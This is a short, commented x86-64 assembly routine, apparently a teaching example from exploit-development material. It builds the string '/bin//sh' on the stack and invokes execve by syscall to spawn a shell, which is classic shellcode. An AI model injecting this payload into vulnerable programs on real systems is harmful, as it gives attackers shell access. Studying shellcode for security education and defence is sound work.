section .text
  global _start
    _start:
      ; The following code calls execve("/bin/sh", ...)
      xor  rdx, rdx        ; 3rd argument
      push rdx
      mov  rax, "/bin//sh"
      push rax
      mov  rdi, rsp        ; 1st argument
      push rdx             ; argv[1]=0
      push rdi             ; argv[0] 
      mov  rsi, rsp        ; 2nd argument
      xor  rax, rax
      mov   al, 0x3b       ; execve()
      syscall
